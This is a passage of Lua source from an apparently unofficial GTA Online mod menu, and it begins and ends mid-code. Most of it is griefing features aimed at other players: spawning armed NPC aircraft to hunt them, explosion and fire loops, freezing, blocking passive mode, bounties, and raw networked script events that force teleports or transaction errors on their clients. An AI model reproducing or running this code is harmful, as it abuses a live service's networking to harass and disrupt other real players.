end;entity.set_entity_god_mode(Air1[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air1[e],46,true)weapon.give_delayed_weapon_to_ped(Air1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air1[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_prop_index(Air1[e],0,0,0,0)ped.set_ped_combat_attributes(Air1[e],1,true)ped.set_ped_combat_attributes(Air1[e],3,false)ped.set_ped_combat_attributes(Air1[e],2,true)ped.set_ped_combat_attributes(Air1[e],52,false)ped.set_ped_combat_attributes(Air1[e],4,true)ped.set_ped_combat_range(Air1[e],2)ped.set_ped_combat_ability(Air1[e],2)ped.set_ped_combat_movement(Air1[e],1)ped.set_ped_max_health(Air1[e],328.0)ped.set_ped_health(Air1[e],328.0)ped.set_ped_config_flag(Air1[e],187,0)ped.set_ped_can_ragdoll(Air1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air1[e],l)end;ped.set_ped_into_vehicle(Air1[e],AirHunter[k],0)while g.on do ai.task_combat_ped(Air1[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air1[e])then return HANDLER_CONTINUE end;for e=1,#Air1 do system.wait(25)ai.task_combat_ped(Air1[e],h,0,16)if utilities.get_distance_between(h,Air1[e])>4000 then network.request_control_of_entity(Air1[e])entity.set_entity_as_no_longer_needed(Air1[e])network.request_control_of_entity(AirHunter[k])entity.set_entity_as_no_longer_needed(AirHunter[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air1 do ped.get_all_peds(Air1[e])system.wait(25)network.request_control_of_entity(Air1[e])entity.set_entity_coords_no_offset(Air1[e],d)entity.set_entity_as_no_longer_needed(Air1[e])entity.delete_entity(Air1[e])end;for k=1,#AirHunter do vehicle.get_all_vehicles(AirHunter[k])system.wait(25)network.request_control_of_entity(AirHunter[k])entity.set_entity_coords_no_offset(AirHunter[k],d)entity.set_entity_as_no_longer_needed(AirHunter[k])entity.delete_entity(AirHunter[k])end end)playerfeature["Send Jet"]=menu.add_player_feature("Send Jet","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+600;d.y=d.y+0;d.z=d.z+300;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air4+1;Air4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air4>=8 then end;entity.set_entity_god_mode(Air4[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xB39B0AE6;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirLazer+1;AirLazer[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirLazer[k],false)vehicle.set_vehicle_mod_kit_type(AirLazer[k],0)vehicle.get_vehicle_mod(AirLazer[k],10)vehicle.set_vehicle_mod(AirLazer[k],10,0,false)ped.set_ped_combat_attributes(Air4[e],46,true)weapon.give_delayed_weapon_to_ped(Air4[e],0x5EF9FEC4,1,1)ped.set_ped_combat_attributes(Air4[e],1,true)ped.set_ped_combat_attributes(Air4[e],3,false)ped.set_ped_combat_attributes(Air4[e],2,true)ped.set_ped_combat_attributes(Air4[e],52,true)ped.set_ped_combat_attributes(Air4[e],4,true)ped.set_ped_combat_attributes(Air4[e],5,true)vehicle.control_landing_gear(AirLazer[k],3)vehicle.get_landing_gear_state(AirLazer[k])ped.set_ped_combat_range(Air4[e],2)ped.set_ped_combat_ability(Air4[e],2)ped.set_ped_combat_movement(Air4[e],1)ped.set_ped_max_health(Air4[e],328.0)ped.set_ped_health(Air4[e],328.0)ped.set_ped_config_flag(Air4[e],187,0)ped.set_ped_can_ragdoll(Air4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air4[e],l)end;ped.set_ped_into_vehicle(Air4[e],AirLazer[k],-1)while g.on do ai.task_combat_ped(Air4[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air4[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#Air4 do system.wait(25)ai.task_combat_ped(Air4[e],h,0,16)if utilities.get_distance_between(h,Air4[e])>8000 then network.request_control_of_entity(Air4[e])entity.set_entity_as_no_longer_needed(Air4[e])network.request_control_of_entity(AirLazer[k])entity.set_entity_as_no_longer_needed(AirLazer[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air4 do ped.get_all_peds(Air4[e])system.wait(25)network.request_control_of_entity(Air4[e])entity.set_entity_coords_no_offset(Air4[e],d)entity.set_entity_as_no_longer_needed(Air4[e])entity.delete_entity(Air4[e])end;for k=1,#AirLazer do vehicle.get_all_vehicles(AirLazer[k])system.wait(25)network.request_control_of_entity(AirLazer[k])entity.set_entity_coords_no_offset(AirLazer[k],d)entity.set_entity_as_no_longer_needed(AirLazer[k])entity.delete_entity(AirLazer[k])end end)playerfeature["Send B-11 Strikeforce"]=menu.add_player_feature("Send B-11 Strikeforce","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+600;d.y=d.y+0;d.z=d.z+300;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air5+1;Air5[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air5>=8 then end;entity.set_entity_god_mode(Air5[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x64DE07A1;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirStrike+1;AirStrike[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirStrike[k],false)vehicle.set_vehicle_mod_kit_type(AirStrike[k],0)vehicle.get_vehicle_mod(AirStrike[k],10)vehicle.set_vehicle_mod(AirStrike[k],10,0,false)ped.set_ped_combat_attributes(Air5[e],46,true)weapon.give_delayed_weapon_to_ped(Air5[e],0x5EF9FEC4,1,1)ped.set_ped_combat_attributes(Air5[e],1,true)ped.set_ped_combat_attributes(Air5[e],3,false)ped.set_ped_combat_attributes(Air5[e],2,true)ped.set_ped_combat_attributes(Air5[e],52,true)ped.set_ped_combat_attributes(Air5[e],4,true)ped.set_ped_combat_attributes(Air5[e],5,true)vehicle.control_landing_gear(AirStrike[k],3)vehicle.get_landing_gear_state(AirStrike[k])ped.set_ped_combat_range(Air5[e],2)ped.set_ped_combat_ability(Air5[e],2)ped.set_ped_combat_movement(Air5[e],1)ped.set_ped_max_health(Air5[e],328.0)ped.set_ped_health(Air5[e],328.0)ped.set_ped_config_flag(Air5[e],187,0)ped.set_ped_can_ragdoll(Air5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air5[e],l)end;ped.set_ped_into_vehicle(Air5[e],AirStrike[k],-1)while g.on do ai.task_combat_ped(Air5[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air5[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#Air5 do system.wait(25)ai.task_combat_ped(Air5[e],h,0,16)if utilities.get_distance_between(h,Air5[e])>8000 then network.request_control_of_entity(Air5[e])entity.set_entity_as_no_longer_needed(Air5[e])network.request_control_of_entity(AirStrike[k])entity.set_entity_as_no_longer_needed(AirStrike[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air5 do ped.get_all_peds(Air5[e])system.wait(25)network.request_control_of_entity(Air5[e])entity.set_entity_coords_no_offset(Air5[e],d)entity.set_entity_as_no_longer_needed(Air5[e])entity.delete_entity(Air5[e])end;for k=1,#AirStrike do vehicle.get_all_vehicles(AirStrike[k])system.wait(25)network.request_control_of_entity(AirStrike[k])entity.set_entity_coords_no_offset(AirStrike[k],d)entity.set_entity_as_no_longer_needed(AirStrike[k])entity.delete_entity(AirStrike[k])end end)

playerfeature["Transaction Error"] = menu.add_player_feature("Transaction Error", "value_str", playerparents["Trolling"].id, function(f, pid)
	if f.value == 0 then
		while f.on do
			script.trigger_script_event(ScriptEvent["Transaction Error"], pid, {player.player_id(), 50000, 0, 1, script_func.get_global_main(pid), script_func.get_global_9(), script_func.get_global_10(), 1})
			system.yield(0)
		end
	else
		local MissionFeat = menu.get_feature_by_hierarchy_key("online.lobby.mission_launcher.freemode_events.destroy_vehicle")
		local previous_coords = player.get_player_coords(player.player_id())
		while f.on do
			MissionFeat:toggle()
			system.yield(500)
			local Entity = entity.get_entity_from_blip(natives.GET_FIRST_BLIP_INFO_ID(225))
			if Entity ~= 0 and Entity ~= nil then
				if utilities.request_control(Entity) then
					natives.SET_NETWORK_ID_CAN_MIGRATE(natives.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Entity), false)
				end
				natives.FREEZE_ENTITY_POSITION(player.get_player_ped(player.player_id()), true)
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), entity.get_entity_coords(Entity) + v3(0, 0, 10))
				fire.add_explosion(entity.get_entity_coords(Entity), 4, false, true, 0.0, player.get_player_ped(pid))
				system.yield(1000)
				if utilities.request_control(Entity) then
					entity.delete_entity(Entity)
				end
				natives.SET_SCRIPT_WITH_NAME_HASH_AS_NO_LONGER_NEEDED("am_destroy_veh")
				natives.TERMINATE_ALL_SCRIPTS_WITH_THIS_NAME("am_destroy_veh")
			end
		end
		if previous_coords then
			natives.FREEZE_ENTITY_POSITION(player.get_player_ped(player.player_id()), false)
			entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), previous_coords)
			previous_coords = nil
		end
	end
end)
playerfeature["Transaction Error"]:set_str_data({"Script Event", "Freemode Mission"})

playerfeature["Atomize"] = menu.add_player_feature("Atomize", "action", playerparents["Trolling"].id, function(f, pid)
	for i = 1, 30 do
		fire.add_explosion(player.get_player_coords(pid) + v3(math.random(-2, 2), math.random(-2, 2), math.random(-2, 2)), 70, true, false, 0.2, player.get_player_ped(pid))
		system.yield(math.random(0, 1))
	end
end)

playerfeature["Taze Player"] = menu.add_player_feature("Taze Player", "toggle", playerparents["Trolling"].id, function(f, pid)
	gameplay.shoot_single_bullet_between_coords(player.get_player_coords(pid) + v3(0, 0, 2), player.get_player_coords(pid), 0, gameplay.get_hash_key("weapon_stungun"), player.get_player_ped(player.player_id()), true, false, 10000)
	system.yield(2500)
end)

playerfeature["Atomize"] = menu.add_player_feature("Atomize", "action", playerparents["Trolling"].id, function(f, pid)
	for i = 1, 30 do
		fire.add_explosion(player.get_player_coords(pid) + v3(math.random(-2, 2), math.random(-2, 2), math.random(-2, 2)), 70, true, false, 0.2, player.get_player_ped(pid))
		system.wait(math.random(0, 1))
	end
end)

playerfeature["Send To Gas Chamber"] = menu.add_player_feature("Send To Gas Chamber", "toggle", playerparents["Trolling"].id, function(f, pid)
    menu.create_thread(function()
        ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
        local object_ = object.create_object(959275690, player.get_player_coords(pid) - v3(0, 0, 0.5), true, false)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 0, pid)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 0, pid)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 0, pid)
		fire.add_explosion(player.get_player_coords(pid), 21, true, false, 0, pid)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 0, pid)
        system.wait(14000)
        entity.delete_entity(object_)
    end, nil)
end)

playerfeature["Make Nearby Peds Hostile"] = menu.add_player_feature("Make Nearby Peds Hostile", "toggle", playerparents["Trolling"].id, function(f, pid)
	while f.on do
		system.yield(500)
		local peds = utilities.get_table_of_entities(ped.get_all_peds(), 25, 100, true, true, player.get_player_coords(pid))
    	for i = 1, #peds do
			ped.set_ped_combat_ability(peds[i], 2)
			ped.set_ped_combat_attributes(peds[i], 5, true)
			ai.task_combat_ped(peds[i], player.get_player_ped(pid), 0, 16)
    	end
	end
end)

playerfeature["Block Passive Mode"] = menu.add_player_feature("Block Passive Mode", "toggle", playerparents["Trolling"].id, function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
			script.trigger_script_event(1920583171, pid, {player.player_id(), 1})
			system.wait(500)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
	if player.is_player_valid(pid) then
		script.trigger_script_event(1920583171, pid, {player.player_id(), 0})
	else
		f.on = false
		menu.notify("Invalid Player.", AddictScript, 3, 211)
		return
	end
end)

playerfeature["Water Loop"] = menu.add_player_feature("Water Loop", "toggle", playerparents["Trolling"].id, function(f, pid)
    while f.on do
        local pos = player.get_player_coords(pid)
        pos.z = pos.z -1
        fire.add_explosion(pos, 13, true, false, 0, pid)
        system.wait(0)
    end
end)

playerfeature["le funne"] = menu.add_player_feature("le funne", "toggle", playerparents["Trolling"].id, function(f, pid)
	while f.on do
		system.yield(0)
		for i = 1, 6 do
			script.trigger_script_event(ScriptEvent["Interior Invite"], pid, {pid, i})
		end
	end
end)

playerparents["Fake Pickup Drops"] = menu.add_player_feature("Fake Pickup Drops", "parent", playerparents["Trolling"].id)

playerfeature["Fake Money Drop"] = menu.add_player_feature("Fake Money Drop", "toggle", playerparents["Fake Pickup Drops"].id, function(f, pid)
	utilities.request_model(gameplay.get_hash_key("p_poly_bag_01_s"))
	while f.on do
		local pickup_ = natives.CREATE_AMBIENT_PICKUP(gameplay.get_hash_key("PICKUP_PORTABLE_CRATE_FIXED_INCAR_SMALL"), player.get_player_coords(pid) + v3(0, 0, 2), 1, 0, gameplay.get_hash_key("p_poly_bag_01_s"), true, true)
		system.yield(50)
	end
end)

playerfeature["Fake RP Drop"] = menu.add_player_feature("Fake RP Drop", "toggle", playerparents["Fake Pickup Drops"].id, function(f, pid)
	while f.on do
		local random_hash = gameplay.get_hash_key("vw_prop_vw_colle_alien")
		local random_int = math.random(1, 8)
		if random_int == 1 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_alien")
		elseif random_int == 2 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_beast")
		elseif random_int == 3 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_imporage")
		elseif random_int == 4 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_pogo")
		elseif random_int == 5 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_prbubble")
		elseif random_int == 6 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_rsrcomm")
		elseif random_int == 7 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_rsrgeneric")
		elseif random_int == 8 then
			random_hash = gameplay.get_hash_key("vw_prop_vw_colle_sasquatch")
		end
		utilities.request_model(random_hash)
		local pickup_ = natives.CREATE_AMBIENT_PICKUP(gameplay.get_hash_key("PICKUP_PORTABLE_CRATE_FIXED_INCAR_SMALL"), player.get_player_coords(pid) + v3(0, 0, 2), 1, 0, random_hash, true, true)
		system.yield(50)
	end
end)

playerparents["Griefing"] = menu.add_player_feature("Griefing", "parent", playerparents["AddictScript"].id)

playerfeature["Set Bounty"] = menu.add_player_feature("Set Bounty", "action_value_str", playerparents["Griefing"].id, function(f, pid)
    local input_stat, input_val = input.get("Enter Bounty Amount (0-10000)", "", 5, 3)
    if input_stat == 1 then
        return HANDLER_CONTINUE
    end
    if input_stat == 2 then
        return HANDLER_POP
    end

	if player.is_player_valid(pid) then
		if f.value == 0 then
			for i = 0, 31 do
				if player.is_player_valid(i) then
					script.trigger_script_event(1370461707, i, {player.player_id(), pid, 1, input_val, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, script_func.get_global_9(), script_func.get_global_10()})
				end
			end
		end
		if f.value == 1 then
			for i = 0, 31 do
				if player.is_player_valid(i) then
					script.trigger_script_event(1370461707, i, {player.player_id(), pid, 1, input_val, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, script_func.get_global_9(), script_func.get_global_10()})
				end
			end
		end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"Anonymous",
	"Named"
})

playerfeature["Send Mugger"] = menu.add_player_feature("Send Mugger", "action_value_str", playerparents["Griefing"].id, function(f, pid)
	if network.is_session_started() then
		if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 400 then
			if not player.is_player_in_any_vehicle(pid) then
				if interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 then
					menu.get_feature_by_hierarchy_key("online.online_players.player_" .. pid .. ".griefing.send_mugger"):toggle()
					system.yield(8000)
					local mugger = nil
					local time = utils.time_ms() + 6000
					while time > utils.time_ms() and mugger == nil do
						local peds = ped.get_all_peds()
						for i = 1, #peds do
							if not ped.is_ped_a_player(peds[i]) and (natives.GET_ENTITY_SCRIPT(peds[i], 0) == "AM_GANG_CALL" or natives.GET_ENTITY_SCRIPT(peds[i], 0) == "am_gang_call") and ped.get_current_ped_weapon(peds[i]) == gameplay.get_hash_key("weapon_knife") and not memory.is_script_entity(peds[i]) then
								mugger = peds[i]
							end
						end
						system.yield(0)
					end
					if mugger ~= nil then
						if utilities.request_control(mugger) then
							entity.set_entity_god_mode(mugger, true)
							entity.set_entity_coords_no_offset(mugger, player.get_player_coords(pid))
							entity.set_entity_heading(mugger, player.get_player_heading(pid))
							entity.set_entity_visible(mugger, false)
							local time = utils.time_ms() + 5000
							while natives.GET_PED_MONEY(mugger) == 0 and time > utils.time_ms() do
								system.yield(0)
							end
							utilities.request_control(mugger)
							if f.value == 0 then
								entity.set_entity_coords_no_offset(mugger, player.get_player_coords(player.player_id()) + v3(0, 0, 3))
								ped.set_ped_health(mugger, 0.0)
								system.yield(100)
							end
							entity.delete_entity(mugger)
						end
						system.yield(1000)
					end
				else
					menu.notify("The player has to be outside.", AddictScript, 6, NotifyColours["red"])
				end
			else
				menu.notify("The player can't be in a vehicle.", AddictScript, 6, NotifyColours["red"])
			end
		else
			menu.notify("You have to be near the player.", AddictScript, 6, NotifyColours["red"])
		end
	else
		menu.notify("You have to be in multiplayer.", AddictScript, 6, NotifyColours["red"])
	end
end)
playerfeature["Send Mugger"]:set_str_data({"Collect Mugged Money", "Delete Mugged Money"})

playerfeature["Mugger Loop"] = menu.add_player_feature("Mugger Loop", "value_str", playerparents["Griefing"].id, function(f, pid)
	local MuggerFeat = menu.get_feature_by_hierarchy_key("online.online_players.player_" .. pid .. ".griefing.send_mugger")
	while f.on do
		if player.is_player_valid(pid) then
			if network.is_session_started() then
				if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 400 then
					if not player.is_player_in_any_vehicle(pid) then
						if interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 then
							natives.SET_THREAD_PRIORITY(0)
							MuggerFeat:toggle()
							system.yield(4000)
							local mugger = nil
							local time = utils.time_ms() + 6000
							while time > utils.time_ms() and mugger == nil do
								local peds = ped.get_all_peds()
								for i = 1, #peds do
									if not ped.is_ped_a_player(peds[i]) and (natives.GET_ENTITY_SCRIPT(peds[i], 0) == "AM_GANG_CALL" or natives.GET_ENTITY_SCRIPT(peds[i], 0) == "am_gang_call") and ped.get_current_ped_weapon(peds[i]) == gameplay.get_hash_key("weapon_knife") and not memory.is_script_entity(peds[i]) then
										mugger = peds[i]
									end
								end
								system.yield(0)
							end
							if mugger ~= nil then
								if utilities.request_control(mugger) then
									entity.set_entity_god_mode(mugger, true)
									entity.set_entity_coords_no_offset(mugger, player.get_player_coords(pid))
									entity.set_entity_heading(mugger, player.get_player_heading(pid))
									entity.set_entity_visible(mugger, false)
									local time = utils.time_ms() + 5000
									while natives.GET_PED_MONEY(mugger) == 0 and time > utils.time_ms() do
										system.yield(0)
									end
									utilities.request_control(mugger)
									if f.value == 0 then
										entity.set_entity_coords_no_offset(mugger, player.get_player_coords(player.player_id()) + v3(0, 0, 3))
										ped.set_ped_health(mugger, 0.0)
										system.yield(100)
									end
									entity.delete_entity(mugger)
								end
								system.yield(1000)
							end
						else
							menu.notify("The player has to be outside.", AddictScript, 6, NotifyColours["red"])
							f.on = false
						end
					else
						menu.notify("The player can't be in a vehicle.", AddictScript, 6, NotifyColours["red"])
						f.on = false
					end
				else
					menu.notify("You have to be near the player.", AddictScript, 6, NotifyColours["red"])
					f.on = false
				end
			else
				menu.notify("You have to be in multiplayer.", AddictScript, 6, NotifyColours["red"])
				f.on = false
			end
		else
			f.on = false
		end
		system.yield(0)
	end
end)
playerfeature["Mugger Loop"]:set_str_data({"Collect Mugged Money", "Delete Mugged Money"})

playerfeature["Glitch Physics"] = menu.add_player_feature("Glitch Physics", "toggle", playerparents["Griefing"].id, function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
    local glitch_hash = gameplay.get_hash_key("p_spinning_anus_s")
    streaming.request_model(glitch_hash)
        local glitched_object = object.create_world_object(glitch_hash, player.get_player_coords(pid), true, false)
        entity.set_entity_visible(glitched_object, false)
        entity.set_entity_god_mode(glitched_object, true)
        entity.set_entity_collision(glitched_object, true, true, true)
        system.yield()
        entity.delete_entity(glitched_object)
        system.yield()
system.wait(100)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

playerfeature["Glitch Physics V2"] = menu.add_player_feature("Glitch Physics V2", "toggle", playerparents["Griefing"].id, function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
    local glitch_hash = gameplay.get_hash_key("prop_shuttering03")
    streaming.request_model(glitch_hash)
        local glitched_object = object.create_world_object(glitch_hash, player.get_player_coords(pid), true, false)
        entity.set_entity_visible(glitched_object, false)
        entity.set_entity_god_mode(glitched_object, true)
        entity.set_entity_collision(glitched_object, true, true, true)
        system.yield()
        entity.delete_entity(glitched_object)
        system.yield()
system.wait(100)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

playerfeature["Freeze Player"] = menu.add_player_feature("Freeze Player", "toggle", playerparents["Griefing"].id, function(f, pid)
    while f.on do
        network.request_control_of_entity(player.get_player_ped(pid))
        native.call(0xC5F68BE9613E2D18, player.get_player_ped(pid), 1, -524452543453, -524452543453, -524452543453, -524452543453, -524452543453, -524452543453, 0, 1, 1, 1, 1, 1)
		script.trigger_script_event(-93722397, pid, {player.player_id()})
        system.yield(0)
    end
end)

playerfeature["Fire loop"] = menu.add_player_feature("Fire loop", "toggle", playerparents["Griefing"].id, function(f, pid)
    while f.on do
        local pos = player.get_player_coords(pid)
        pos.z = pos.z -1
        fire.add_explosion(pos, 12, true, false, 0, pid)
        system.wait(0)
    end
end)

playerfeature["Send To Cayo Perico"] = menu.add_player_feature("Send To Cayo Perico", "action_value_str", playerparents["Griefing"].id, function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(-910497748, pid, {player.player_id(), 0})
		elseif f.value == 1 then
       		script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 3, 1})
		elseif f.value == 2 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, 1})
		elseif f.value == 3 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, })
		elseif f.value == 4 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, 0})
        end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"Original",
	"Beach Party (Plane)",
	"Beach Party (Instant)",
	"Los Santos (Airport)",
	"Los Santos (Beach)"
})

playerfeature["Send To Warehouse"] = menu.add_player_feature("Send To Warehouse", "action", playerparents["Griefing"].id, function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(434937615, pid, {player.player_id(), 0, 1, math.random(1, 22)})
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

playerfeature["Send To Mission"] = menu.add_player_feature("Send To Mission", "action", playerparents["Griefing"].id, function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(1858712297, pid, {player.player_id(), math.random(1, 7)})
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

playerparents["Friendly"] = menu.add_player_feature("Friendly", "parent", playerparents["AddictScript"].id)

playerparents["Give Collectibles"] = menu.add_player_feature("Give Collectibles", "parent", playerparents["Friendly"].id)

playerfeature["Give RP"] = menu.add_player_feature("Give RP", "action", playerparents["Give Collectibles"].id, function(f, pid) -- Skidded from Prism, credits to him
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 5, 0, 1, 1, 1})
	system.yield(1)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 0, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 1, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 3, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 10, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 16, i, 1, 1, 1})
		system.yield(1)
	end
	for i = 0, 1 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 2, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 6, i, 1, 1, 1})
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 17, i, 1, 1, 1})
		system.yield(1)
	end
	for i = 0, 19 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 4, i, 1, 1, 1})
		system.yield(1)
	end
	for i = 0, 99 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 9, i, 1, 1, 1})
		system.yield(1)
	end
end)

playerfeature["Give Movie Props"] = menu.add_player_feature("Give Movie Props", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 0, i, 1, 1, 1})
	end
end)

playerfeature["Give Hidden Caches"] = menu.add_player_feature("Give Hidden Caches", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 1, i, 1, 1, 1})
	end
end)

playerfeature["Give Treasure Chests"] = menu.add_player_feature("Give Treasure Chests", "action", playerparents["Give Collectibles"].id, function(f, pid)
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 2, 0, 1, 1, 1})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 2, 1, 1, 1, 1})
end)

playerfeature["Give Radio Antennas"] = menu.add_player_feature("Give Radio Antennas", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 3, i, 1, 1, 1})
	end
end)

playerfeature["Give Media USBs"] = menu.add_player_feature("Give Media USBs", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 19 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, 1, 1, 1})
	end
end)

playerfeature["Give Shipwrecks"] = menu.add_player_feature("Give Shipwrecks", "action", playerparents["Give Collectibles"].id, function(f, pid)
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 5, 0, 1, 1, 1})
end)

playerfeature["Give Burried Stashes"] = menu.add_player_feature("Give Burried Stashes", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 6, i, 1, 1, 1})
	end
end)

playerfeature["Give LD Organics Product"] = menu.add_player_feature("Give LD Organics Product", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 9, i, 1, 1, 1})
	end
end)

playerfeature["Give Junk Energy Skydives"] = menu.add_player_feature("Give Junk Energy Skydives", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 10, i, 1, 1, 1})
	end
end)

playerfeature["Give Tuner Collectibles"] = menu.add_player_feature("Give Tuner Collectibles", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, 1, 1, 1})
	end
end)

playerfeature["Give Snowmen"] = menu.add_player_feature("Give Snowmen", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 16, i, 1, 1, 1})
	end
end)

playerfeature["Give G's Caches"] = menu.add_player_feature("Give test", "action", playerparents["Give Collectibles"].id, function(f, pid)
	for i = 0, 9 do
